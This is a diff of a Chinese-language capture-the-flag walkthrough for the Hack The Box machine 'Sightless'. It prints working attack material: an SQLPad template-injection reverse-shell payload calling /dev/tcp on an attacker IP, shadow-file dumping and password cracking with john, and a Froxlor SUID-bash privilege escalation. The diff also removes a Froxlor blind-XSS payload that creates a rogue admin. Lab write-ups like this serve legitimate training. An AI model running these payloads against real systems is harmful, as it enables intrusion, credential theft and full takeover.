@@ -1,9 +1,11 @@
 ## Sightless
-
+### 本靶机不寻常的事情：
 #### SQLPad 应用程序在 Sightlight 上以哪个系统用户身份运行？root
+#### 横行提权不需要漏洞，利用了管理员功能去做不安全操作
+
+### 1.namp
 ```
 [★]$ nmap -sC -sV 10.129.231.103
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-03 02:44 CDT
 Nmap scan report for sightless.htb (10.129.231.103)
 Host is up (0.010s latency).
 Not shown: 997 closed tcp ports (reset)
@@ -22,15 +24,19 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: nginx/1.18.0 (Ubuntu)
 |_http-title: Sightless.htb
 ```
-
-```
-{{ process.mainModule.require('child_process').exec('echo "#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.71/4455 0>&1" > /tmp/exploit.sh') }}
-```
-
-
+#### 加入域名访问浏览器
+![感冒前行感觉太好了](images/090501.png)
+#### 点击SQLPad
+![感冒前行感觉太好了](images/090502.png)
+#### 发现了版本，搜索版本漏洞：CVE-2022-0944
+#### https://nvd.nist.gov/vuln/detail/CVE-2022-0944
+### 2.
+#### 漏洞的使用：https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb
 ```
 $ nc -lvnp 4455
 ```
+#### 首先开启监听，需要2条命令才有回应
+![感冒前行感觉太好了](images/090503.png)
 在浏览器Database发送：
 ```
 {{ process.mainModule.require('child_process').exec('echo "#!/bin/bash\nbash -i
@@ -56,7 +62,9 @@ drwxr-xr-x 1 root root   4096 Mar 12  2022 ..
 drwxr-xr-x 2 root root   4096 Aug  9  2024 cache
 drwxr-xr-x 2 root root   4096 Aug  9  2024 sessions
 -rw-r--r-- 1 root root 188416 Sep  3 13:40 sqlpad.sqlite
-
+```
+### 3./etc/passwd与/etc/shadow合并成密码，工具是john unshadow
+```
 root@c184118df0a6:/var/lib/sqlpad# cat /etc/shadow
 cat /etc/shadow
 root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
@@ -78,6 +86,7 @@ root@c184118df0a6:/var/lib/sqlpad# grep '^michael:' /etc/passwd > passwd_michael
 <lpad# grep '^michael:' /etc/passwd > passwd_michael
 root@c184118df0a6:/var/lib/sqlpad# grep '^michael:' /etc/shadow > shadow_michael
 <lpad# grep '^michael:' /etc/shadow > shadow_michael
+
 root@c184118df0a6:/var/lib/sqlpad# ls -la
 ls -la
 total 208
@@ -88,6 +97,7 @@ drwxr-xr-x 2 root root   4096 Aug  9  2024 cache
 drwxr-xr-x 2 root root   4096 Aug  9  2024 sessions
 -rw-r--r-- 1 root root    134 Sep  3 13:53 shadow_michael
 -rw-r--r-- 1 root root 188416 Sep  3 13:50 sqlpad.sqlite
+
 root@c184118df0a6:/var/lib/sqlpad# cat passwd_michael
 cat passwd_michael
 michael:x:1001:1001::/home/michael:/bin/bash
@@ -95,7 +105,7 @@ root@c184118df0a6:/var/lib/sqlpad# cat shadow_michael
 cat shadow_michael
 michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
 ```
-#### 将合并Passwd_michael和shadow_michael，从 passwd 文件拿到用户名和 UID 等信息；从 shadow 文件拿到用户名和密码哈希。
+#### 将合并Passwd_michael和shadow_michael，从 passwd 文件拿到用户名和 UID 等信息；从 shadow 文件拿到用户名和密码哈希。(手动从反向连接复制 粘贴到本地终端)
 ```
 [★]$ vi passwd_michael
 ┌─[us-dedivip-1]─[10.10.14.71]─[syareya55@htb-tpkybyu0pr]─[~/Sightless]
@@ -104,7 +114,9 @@ michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDE
 └──╼ [★]$ cat passwd_michael shadow_michael
 michael:x:1001:1001::/home/michael:/bin/bash
 michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
-
+```
+#### 它们的合并需要用到john unshadow
+```
 [★]$ sudo apt install john -y
 [★]$ cp /usr/share/wordlists/rockyou.txt.gz .
 [★]$ gunzip rockyou.txt.gz
@@ -129,6 +141,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 #### 密码为insaneclownposse
+### 4.ssh登录
 ```
 [★]$ ssh michael@10.129.243.28
 The authenticity of host '10.129.243.28 (10.129.243.28)' can't be established.
@@ -143,50 +156,7 @@ michael@sightless:~$ id
 uid=1000(michael) gid=1000(michael) groups=1000(michael)
 michael@sightless:~$ cat user.txt
 ```
-#### 然后，可以继续使用netstat检查系统上存在的开放端口命令
-```
-michael@sightless:~$ netstat -lputu
-(Not all processes could be identified, non-owned process info
- will not be shown, you would have to be root to see it all.)
-Active Internet connections (only servers)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
-tcp        0      0 localhost:33060         0.0.0.0:*               LISTEN      -                   
-tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN      -                   
-tcp        0      0 localhost:3000          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 localhost:36193         0.0.0.0:*               LISTEN      -                   
-tcp        0      0 localhost:34175         0.0.0.0:*               LISTEN      -                   
-tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN      -                   
-tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN      -                   
-tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      -                   
-tcp        0      0 localhost:http-alt      0.0.0.0:*               LISTEN      -                   
-tcp        0      0 localhost:57023         0.0.0.0:*               LISTEN      -                   
-tcp6       0      0 [::]:ftp                [::]:*                  LISTEN      -                   
-tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      -                   
-udp        0      0 localhost:domain        0.0.0.0:*                           -                   
-udp        0      0 0.0.0.0:bootpc          0.0.0.0:*
-
-michael@sightless:~$ netstat -lputn
-(Not all processes could be identified, non-owned process info
- will not be shown, you would have to be root to see it all.)
-Active Internet connections (only servers)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
-tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:34761         0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:41447         0.0.0.0:*               LISTEN      -                   
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
-tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:59967         0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
-tcp6       0      0 :::21                   :::*                    LISTEN      -                   
-tcp6       0      0 :::22                   :::*                    LISTEN      -                   
-udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
-udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
-michael@sightless:~$
-```
-
+### 4.1 检查系统上存在的开放端口
 ```
 michael@sightless:~$ ss -lntp
 State   Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process  
@@ -202,12 +172,6 @@ LISTEN  0        511            127.0.0.1:8080           0.0.0.0:*
 LISTEN  0        4096           127.0.0.1:40805          0.0.0.0:*              
 LISTEN  0        128                    *:21                   *:*              
 LISTEN  0        128                 [::]:22                [::]:*
-
-
-[★]$ ssh michael@sightless.htb -L 40337:127.0.0.1:40337
-michael@sightless.htb's password: 
-Last login: Fri Sep  5 05:22:19 2025 from 10.10.14.80
-michael@sightless:~$
 ```
 ```
 本地只监听的端口（127.0.0.1）——重点关注
@@ -217,17 +181,41 @@ michael@sightless:~$
 40805	也可能是某个内部服务或后门程序
 45217	高位本地端口，可能是某个后台服务、临时监听或后门
 ```
+### 5.1 第一次转口转发
+```
+[★]$ ssh michael@sightless.htb -L 40337:127.0.0.1:40337
+michael@sightless.htb's password: 
+Last login: Fri Sep  5 05:22:19 2025 from 10.10.14.80
+michael@sightless:~$
+```
 #### 在终端输入chromium，跳出了浏览器，输入：chrome://inspect
+![感冒前行感觉太好了](images/090504.png)
 #### 在Configure：127.0.0.1:40337
 #### 在http://admin.sightless.htb下面,点击inspect->在Network->index.php->Payloa->用户密码
+![感冒前行感觉太好了](images/090505.png)
+### 5.2 第二次转口转发
 ```
 [★]$ ssh michael@sightless.htb -L 10.10.14.80:8081:127.0.0.1:8080
 michael@sightless.htb's password: 
 Last login: Fri Sep  5 06:39:59 2025 from 10.10.14.80
 michael@sightless:~$
 ```
-
-
+#### 使用浏览器Firefox登录10.10.14.80:8081（本机IP+端口)
+##### 这里不需要用户web1,去连接FTP；[ *:21    21端口开放连接反倒连接不上】
+```
+1.利用 Froxlor 的管理员功能 修改 PHP-FPM restart 命令
+2.重启 PHP-FPM → 执行 chmod 4755 /bin/bash
+3.SUID 权限使 /bin/bash 可以被普通用户提升为 root
+4.bash -p 激活 SUID 权限，获得 root
+```
+### 步骤1（用户admin)
+#### PHP-->PHP_FPM versions-->Ceate
+![感冒前行感觉太好了](images/090506.png)
+#### [1]Short description → pwned //标记
+#### [2]php-fpm restart command → chmod 4755 /bin/bash  //PHP-FPM 重启命令
+#### 把 /bin/bash 设置成 SUID root (4 表示 SUID)，意味着普通用户执行 /bin/bash -p 可以获得 root 权限
+#### [3]Process manager control (pm) → dynamic //允许 PHP-FPM 动态管理子进程，确保重启命令生效
+#### [4]Save
 ```
 michael@sightless:~$ stat /bin/bash
   File: /bin/bash
@@ -239,17 +227,18 @@ Modify: 2024-03-14 11:31:47.000000000 +0000
 Change: 2024-08-09 11:17:02.286877914 +0000
  Birth: 2024-05-15 03:23:31.234885684 +0000
 ```
-
+#### 权限是0755
+### 步骤2（用户admin)
+#### System-->PHP-FPM
+![感冒前行感觉太好了](images/090507.png)
+#### php-fpm enable/disable 关了,Save,再开，Save
+![感冒前行感觉太好了](images/090508.png)
 ```
 michael@sightless:~$ stat /bin/bash
-  File: /bin/bash
-  Size: 1396520   	Blocks: 2728       IO Block: 4096   regular file
-Device: fd00h/64768d	Inode: 700         Links: 1
-Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
-Access: 2025-09-05 08:15:01.213417255 +0000
-Modify: 2024-03-14 11:31:47.000000000 +0000
-Change: 2025-09-05 08:10:02.081430310 +0000
- Birth: 2024-05-15 03:23:31.234885684 +0000
+```
+![感冒前行感觉太好了](images/090509.png)
+
+```
 michael@sightless:~$ bash -p
 bash-5.1# id
 uid=1000(michael) gid=1000(michael) euid=0(root) groups=1000(michael)
@@ -265,46 +254,7 @@ lrwxrwxrwx 1 root    root       9 May 21  2024 .bash_history -> /dev/null
 drwx------ 2 michael michael 4096 May 15  2024 .ssh
 -rw-r----- 1 root    michael   33 Sep  4 15:50 user.txt
 
-bash-5.1# cd /dev/shm
-bash-5.1# ls -la
-total 0
-drwxrwxrwt  2 root root   40 Sep  4 15:50 .
-drwxr-xr-x 20 root root 4020 Sep  4 15:48 ..
-
 bash-5.1# cat /root/root.txt
 4af9c062be0b320a316c87fe16c0f7f6
 
 ```
-
-#### 这里我们看到端口http是打开的。我们可以使用SSH对其进行端口转发
-```
-[★]$ ssh michael@sightless.htb -L 10.10.14.80:8083:127.0.0.1:8080  
-
-michael@sightless.htb's password: 
-
-michael@sightless:~$
-```
-#### 神奇，竟然还有个输入端口
-图
-#### 在访问端口时，我们会看到一个Froxlor登录页面，这是一个轻量级服务器管理软件
-#### https://nvd.nist.gov/vuln/detail/CVE-2024-34070
-### 在拦截burpsuite流量时，Froxlor登录的用户和密码随意
-Froxlor 是一款开源服务器管理软件。在 ​​2.1.9 之前的版本中，Froxlor 应用程序的“登录失败尝试日志记录”功能中发现了一个存储盲跨站脚本 (XSS) 漏洞。未经身份验证的用户可以在登录尝试时向 loginname 参数注入恶意脚本，这些脚本会在管理员查看系统日志时执行。
-
-#### 鄙人输入了8282:127.0.0.1:8080 ,在使用burpsuite的时候，自找苦吃
-#### 梅开二度，即使8081:127.0.0.1:8080；在 Burp 里设置的 Redirect 127.0.0.1:8081 只有在浏览器流量进入 Burp 时才会生效，现在流量根本没进入 Burp → Redirect 根本没用
-图
-#### 使用本机地址+端口在burpuite截取转发端口的流量，即8081:127.0.0.1:8080换成10.10.14.80:8083:127.0.0.1:8080,burpsuite也不要设置Redirect端口了。
-图
-
-
-#### https://github.com/advisories/GHSA-x525-54hf-xr53点击payload.txt是如下的内容：
-```
-admin{{$emit.constructor`function+b(){var+metaTag%3ddocument.querySelector('meta[name%3d"csrf-token"]')%3bvar+csrfToken%3dmetaTag.getAttribute('content')%3bvar+xhr%3dnew+XMLHttpRequest()%3bvar+url%3d"https%3a//demo.froxlor.org/admin_admins.php"%3bvar+params%3d"new_loginname%3dabcd%26admin_password%3dAbcd%40%401234%26admin_password_suggestion%3dmgphdKecOu%26def_language%3den%26api_allowed%3d0%26api_allowed%3d1%26name%3dAbcd%26email%3dyldrmtest%40gmail.com%26custom_notes%3d%26custom_notes_show%3d0%26ipaddress%3d-1%26change_serversettings%3d0%26change_serversettings%3d1%26customers%3d0%26customers_ul%3d1%26customers_see_all%3d0%26customers_see_all%3d1%26domains%3d0%26domains_ul%3d1%26caneditphpsettings%3d0%26caneditphpsettings%3d1%26diskspace%3d0%26diskspace_ul%3d1%26traffic%3d0%26traffic_ul%3d1%26subdomains%3d0%26subdomains_ul%3d1%26emails%3d0%26emails_ul%3d1%26email_accounts%3d0%26email_accounts_ul%3d1%26email_forwarders%3d0%26email_forwarders_ul%3d1%26ftps%3d0%26ftps_ul%3d1%26mysqls%3d0%26mysqls_ul%3d1%26csrf_token%3d"%2bcsrfToken%2b"%26page%3dadmins%26action%3dadd%26send%3dsend"%3bxhr.open("POST",url,true)%3bxhr.setRequestHeader("Content-type","application/x-www-form-urlencoded")%3balert("Your+Froxlor+Application+has+been+completely+Hacked")%3bxhr.send(params)}%3ba%3db()`()}}
-```
-#### https://gchq.github.io/CyberChef/
-#### 修改htttps://admin.sightless.htb:8080
-```
-admin{{$emit.constructor`function b(){var metaTag=document.querySelector('meta[name="csrf-token"]');var csrfToken=metaTag.getAttribute('content');var xhr=new XMLHttpRequest();var url="https://admin.sightless.htb:8080/admin_admins.php";var params="new_loginname=abcd&admin_password=Abcd@@1234&admin_password_suggestion=mgphdKecOu&def_language=en&api_allowed=0&api_allowed=1&name=Abcd&email=yldrmtest@gmail.com&custom_notes=&custom_notes_show=0&ipaddress=-1&change_serversettings=0&change_serversettings=1&customers=0&customers_ul=1&customers_see_all=0&customers_see_all=1&domains=0&domains_ul=1&caneditphpsettings=0&caneditphpsettings=1&diskspace=0&diskspace_ul=1&traffic=0&traffic_ul=1&subdomains=0&subdomains_ul=1&emails=0&emails_ul=1&email_accounts=0&email_accounts_ul=1&email_forwarders=0&email_forwarders_ul=1&ftps=0&ftps_ul=1&mysqls=0&mysqls_ul=1&csrf_token="+csrfToken+"&page=admins&action=add&send=send";xhr.open("POST",url,true);xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");alert("Your Froxlor Application has been completely Hacked");xhr.send(params)};a=b()`()}}
-```
-
